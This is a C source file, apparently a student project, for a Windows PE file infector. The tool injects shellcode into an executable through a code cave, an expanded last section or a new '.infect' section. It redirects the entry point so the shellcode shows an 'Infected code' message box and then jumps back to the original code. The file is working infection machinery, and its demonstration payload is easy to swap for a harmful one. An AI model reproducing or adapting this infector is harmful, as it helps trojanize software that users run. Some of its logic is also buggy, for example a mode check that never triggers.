#ifndef STABLEINFECT
#define STABLEINFECT

#include <windows.h>
#include <stdio.h>
#include "PEFile.h"
#include "utils.h"
#include <stdlib.h>
#include <time.h>
#include "code.h"

DWORD PositionOfSetCaptionInShellcode       = POS_SET_CAP_STABLE;
DWORD PositionOfSetTextInShellcode          = POS_SET_TEXT_STABLE;
DWORD PositionOfSetDLLNameInShellcode       = POS_SET_DLLNAME_STABLE;
DWORD PositionOfSetMesBoxVersionInShellCode = POS_SET_MESBOX_VERSION_STABLE;
DWORD PositionOfCallLoadLibInShellcode      = POS_CALL_LOAD_STABLE;
DWORD PositionOfCallGetProcInShellcode      = POS_CALL_GET_PROC_STABLE;
DWORD PositionOfJmp                         = POS_JMP_STABLE;
UCHAR *Caption = "17520074 - 17520467";
UCHAR *Text    = "Infected code";

int stableInfectMessageBox(
    UCHAR *FileName, 
    UCHAR *NewFileName, 
    INT Mode,
    char MB
){
    FILE *FinHandle;
    FILE *FouHandle;
    UCHAR CurrentInputFileName[0xff];
    UCHAR tmpOutFileName[0xff];
    
    // Copy current input file to tmp file
    itoa(rand() * rand(), CurrentInputFileName, 10);
    FinHandle = fopen(FileName, "rb");
    FouHandle = fopen(CurrentInputFileName, "wb");
    copyFile(FouHandle, FinHandle, 0xfff);
    fclose(FinHandle);
    fclose(FouHandle);

    DWORD nBytesOfPlaceHold = 0x20;
    DWORD OffsetOfCaption = (DWORD) endStableCode - (DWORD) stableCode + nBytesOfPlaceHold;
    DWORD OffsetOfText = OffsetOfCaption + strlen(Caption) * 2 + 2;
    DWORD OffsetOfDLLName = OffsetOfText + strlen(Text) * 2 + 2;
    DWORD LengthOfShellcode = OffsetOfDLLName + strlen("KERNEL32.dll") * 2 + 0x10;

    IMAGE_DOS_HEADER DOSHeader;
    IMAGE_NT_HEADERS32 NTHeaders;
    IMAGE_SECTION_HEADER SectionHeaders[MAX_SECTIONS];
    FinHandle = fopen(CurrentInputFileName, "rb");
    readPE32Header(FinHandle, &DOSHeader, &NTHeaders, SectionHeaders);
    fclose(FinHandle);

    IMAGE_SECTION_HEADER WhereSection; // Section which will be infected with shellcode
    DWORD Length;   // Length of code cave
    DWORD Offset;   // Offset of code cave in file
    
    FinHandle = fopen(CurrentInputFileName, "rb");
    if (Mode == 0) {
        printf("Using mode find code cave\n");
        Offset = findOffsetOfCodeCave(FinHandle, &WhereSection, &Length);
        fclose(FinHandle);
    }
    else if (Mode == 1) {
        printf("Using mode expand last section\n");

        itoa(rand() * rand(), tmpOutFileName, 10);
        FouHandle = fopen(tmpOutFileName, "wb");

        Offset = expandLastSection(FinHandle, FouHandle, LengthOfShellcode, 1);
        Length = LengthOfShellcode;
        WhereSection = SectionHeaders[NTHeaders.FileHeader.NumberOfSections - 1];

        fclose(FinHandle);
        fclose(FouHandle);

        remove(CurrentInputFileName);
        strcpy(CurrentInputFileName, tmpOutFileName);
    }
    else if (Mode == 2) {
        printf("Using mode add a section\n");
        itoa(rand() * rand(), tmpOutFileName, 10);

        FouHandle = fopen(tmpOutFileName, "wb");
        Offset = addEmptySection(FinHandle, FouHandle, ".infect", LengthOfShellcode, 1);
        
        fclose(FinHandle);
        fclose(FouHandle);

        remove(CurrentInputFileName);
        strcpy(CurrentInputFileName, tmpOutFileName);

        IMAGE_DOS_HEADER DOSHeader;
        IMAGE_NT_HEADERS32 NTHeaders;
        IMAGE_SECTION_HEADER SectionHeaders[MAX_SECTIONS];
        FILE *tmpF = fopen(CurrentInputFileName, "rb");
        readPE32Header(tmpF, &DOSHeader, &NTHeaders, SectionHeaders);
        fclose(tmpF);

        WhereSection = SectionHeaders[NTHeaders.FileHeader.NumberOfSections - 1];
        Length = WhereSection.SizeOfRawData;
    }
    else{
        printf("Invalid Mode 1. Find code cave  2. expand last section  3. add a section\n");
        remove(CurrentInputFileName);
        return 1;
    }
    
    if (Length < LengthOfShellcode){
        printf("Not enough memory to infect shellcode\n");
        remove(CurrentInputFileName);
        return 1;
    }
    printf("Offset: 0x%x\nLength: %d\n", Offset, Length);
    
    // Adjust Address of Entry Point and save old Address of Entry Point
    itoa(rand() * rand(), tmpOutFileName, 10);
    FinHandle = fopen(CurrentInputFileName, "rb");
    FouHandle = fopen(tmpOutFileName, "wb");
    DWORD OldEntryPoint = adjustEntryPoint(FinHandle, FouHandle, Offset);
    fclose(FouHandle);
    fclose(FinHandle);
    remove(CurrentInputFileName);
    strcpy(CurrentInputFileName, tmpOutFileName);

    // Find Address of LoadLibrary and GetProcAddress function
    // Have 2 version of LoadLibrary Function is A and W
    // Version A receive caption and text as char string
    // Version W receive caption and text as wchar string
    FinHandle = fopen(CurrentInputFileName, "rb");
    DWORD LoadLibAddress;
    char LoadLibSymbol;
    DWORD LoadLibWAddress = findFuncAddressByName(FinHandle, "KERNEL32.dll", "LoadLibraryW");
    DWORD LoadLibAAddress = findFuncAddressByName(FinHandle, "KERNEL32.dll", "LoadLibraryA");
    DWORD GetProcAddrAddress = findFuncAddressByName(FinHandle, "KERNEL32.dll", "GetProcAddress");
    fclose(FinHandle);
    
    if (LoadLibAAddress){
        printf("Using LoadLibraryA, Address: 0x%x\n", LoadLibAAddress);
        LoadLibAddress = LoadLibAAddress;
        LoadLibSymbol = 'A';
    }
    else if (LoadLibWAddress){
        printf("Using MessageBoxW, Address: 0x%x\n", LoadLibWAddress);
        LoadLibAddress = LoadLibWAddress;
        LoadLibSymbol = 'W';
    }
    if (LoadLibAddress == 0 && GetProcAddrAddress == 0) {
        printf("Occurs a problem when find LoadLibrary or GetProcAddress function address\n");
        remove(CurrentInputFileName);
        return 1;
    }
    // Copy shellcode to writable memory
    UCHAR *ShellCode = (UCHAR *) malloc(LengthOfShellcode);
    memset(ShellCode, 0, LengthOfShellcode);
    memcpy(ShellCode, stableCode, (int) endStableCode - (int) stableCode);

    // Adjust call LoadLibrary instruction
    // Call to a direct address instead of a relative address
    UCHAR CallShellcode[6] = {0xff, 0x15, 0x00, 0x00, 0x00, 0x00}; 
    DWORD2AddressAsShellcode(LoadLibAddress, CallShellcode + 2);
    // Replace a normal call to direct call
    memDel(ShellCode, LengthOfShellcode, PositionOfCallLoadLibInShellcode, 5);
    memIns(ShellCode, LengthOfShellcode, CallShellcode, 6, PositionOfCallLoadLibInShellcode);
    
    // After adjust call LoadLibrary instruction, position of below instruct will increase 1
    PositionOfCallGetProcInShellcode += 1; 
    PositionOfJmp += 1;
    PositionOfSetCaptionInShellcode += 1;
    PositionOfSetTextInShellcode += 1;
    PositionOfSetMesBoxVersionInShellCode += 1;

    // Set Mesbox version
    memset(ShellCode + PositionOfSetMesBoxVersionInShellCode, MB, 1);

    // Adjust call GetProcAddress instruction
    // Call to a direct address instead of a relative address
    DWORD2AddressAsShellcode(GetProcAddrAddress, CallShellcode + 2);
    // Replace a normal call to direct call
    memDel(ShellCode, LengthOfShellcode, PositionOfCallGetProcInShellcode, 5);
    memIns(ShellCode, LengthOfShellcode, CallShellcode, 6, PositionOfCallGetProcInShellcode);

    // After adjust call GetProcAddress instruction, position of below instruct will increase 1
    PositionOfJmp += 1;
    PositionOfSetCaptionInShellcode += 1;
    PositionOfSetTextInShellcode += 1;

    // Adjust jmp instruction jump to old address of entrypoint
    DWORD RVAOfJmpInstruction = Offset + PositionOfJmp - WhereSection.PointerToRawData + WhereSection.VirtualAddress;
    DWORD RelativeAddressToOldEntryPoint = OldEntryPoint - RVAOfJmpInstruction - 5;
    UCHAR JmpShellcode[5] = {0xE9, 0x00, 0x00, 0x00, 0x00};
    DWORD2AddressAsShellcode(RelativeAddressToOldEntryPoint, JmpShellcode + 1);
    // Edit jmp instruction
    memcpy(ShellCode + PositionOfJmp, JmpShellcode, 5);
    
    
    // Adjust RVA of Caption and Text Address
    DWORD Offset2RVA = -WhereSection.PointerToRawData + WhereSection.VirtualAddress + NTHeaders.OptionalHeader.ImageBase;
    DWORD RVAOfCaption = Offset + OffsetOfCaption + Offset2RVA;
    DWORD RVAOfText = Offset + OffsetOfText + Offset2RVA;
    DWORD RVAOfDLLName = Offset + OffsetOfDLLName + Offset2RVA;
    
    UCHAR RVAOfCaptionAsShellcode[4];
    UCHAR RVAOfTextAsShellcode[4];
    UCHAR RVAOfDLLNameAsShellcode[4];
    DWORD2AddressAsShellcode(RVAOfCaption, RVAOfCaptionAsShellcode);
    DWORD2AddressAsShellcode(RVAOfText, RVAOfTextAsShellcode);
    DWORD2AddressAsShellcode(RVAOfDLLName, RVAOfDLLNameAsShellcode);

    memcpy(ShellCode + PositionOfSetCaptionInShellcode + 3, RVAOfCaptionAsShellcode, 4);
    memcpy(ShellCode + PositionOfSetTextInShellcode + 3, RVAOfTextAsShellcode, 4);
    memcpy(ShellCode + PositionOfSetDLLNameInShellcode + 3, RVAOfDLLNameAsShellcode, 4);

    // Put Caption, Text and DLL name to Shellcode corresponding to version of functions
    char MesBoxSymbol = MB; 
    if (MesBoxSymbol == 'A'){
        memcpy(ShellCode + OffsetOfCaption, Caption, strlen(Caption) + 1);
        memcpy(ShellCode + OffsetOfText, Text, strlen(Text) + 1);
    }
    else{
        unsigned short WCaption[0xff];
        unsigned short WText[0xff];
        char2Wchar(Caption, WCaption);
        char2Wchar(Text, WText);

        memcpy(ShellCode + OffsetOfCaption, WCaption,  strlen(Caption) * 2 + 2);
        memcpy(ShellCode + OffsetOfText, WText, strlen(Text) * 2 + 2);
    }

    if (LoadLibSymbol == 'A'){
        memcpy(ShellCode + OffsetOfDLLName, "USER32.dll", strlen("USER32.dll") + 1);
    }
    else{
        unsigned short WDLLName[0xf];
        char2Wchar("USER32.dll", WDLLName);
        memcpy(ShellCode + OffsetOfDLLName, WDLLName,  strlen("USER32.dll") * 2 + 2);
    }

    // Infect shellcode to file
    FinHandle = fopen(CurrentInputFileName, "rb");
    FouHandle = fopen(NewFileName, "wb");
    infectShellcode(FinHandle, FouHandle, ShellCode, LengthOfShellcode, Offset);
    fclose(FinHandle);
    fclose(FouHandle);
    remove(CurrentInputFileName);
    return 0;
}

#endif
 
int main(int argc, char *argv[]){
    srand(time(NULL));

    char USAGE[0xff0];
    char *USAGE_FORMAT = 
    "USAGE:\n"
    "\t%s [PEFile] [NewPEFile] [MODE] [MESBOXVERSION]\n"
    "OLIDGATORY ARGUMENTS:\n"
    "\tPEFile\t\tName of file which want to infect shellcode to it\n"
    "\tNewPEFile\tName of infected file\n"
    "MODE OPTIONS:\n"
    "\t-mode0\t\tInfect shellcode to a codecave (not change size of file) - By default\n"
    "\t-mode1\t\tExpand last section to infect shellcode\n"
    "\t-mode2\t\tAdd more one section to infect shellcode\n"
    "MESBOXVERSION OPTIONS:\n"
    "\t-MBA\t\tUsing MessageBoxA - By default\n"
    "\t-MBW\t\tUsing MessageBoxW\n";
    sprintf(USAGE, USAGE_FORMAT, argv[0]);

    if (argc < 3 || argc > 5){
        printf(USAGE);
        return 1;
    }

    char MesBoxVersion = 'A';
    int Mode = 0;

    if (argc > 3){
        if(memcmp("-mode", argv[3], 5) == 0){
            Mode = atoi(argv[3] + 5);
            if (Mode < 0 && Mode > 2){
                printf(USAGE);
                return 1;
            }
        }
        else if(memcmp("-MB", argv[3], 3) == 0){
            MesBoxVersion = argv[3][3];
            if (MesBoxVersion != 'A' && MesBoxVersion != 'W'){
                printf(USAGE);
                return 1;
            }
        }
        else {
            printf(USAGE);
            return 1;
        }
    }

    if (argc > 4){
        if(memcmp("-mode", argv[4], 5) == 0){
            Mode = atoi(argv[4] + 5);
            if (Mode < 0 && Mode > 2){
                printf(USAGE);
                return 1;
            }
        }
        else if(memcmp("-MB", argv[4], 3) == 0){
            MesBoxVersion = argv[4][3];
            if (MesBoxVersion != 'A' && MesBoxVersion != 'W'){
                printf(USAGE);
                return 1;
            }
        }
        else {
            printf(USAGE);
            return 1;
        }
    }
    
    if (stricmp(argv[1], argv[2]) == 0){
        printf("Input file and output file must not be the same\n");
        return 1;
    }

    stableInfectMessageBox(
        argv[1],      
        argv[2],      
        Mode,          
        MesBoxVersion 
    ); 
    return 0;
}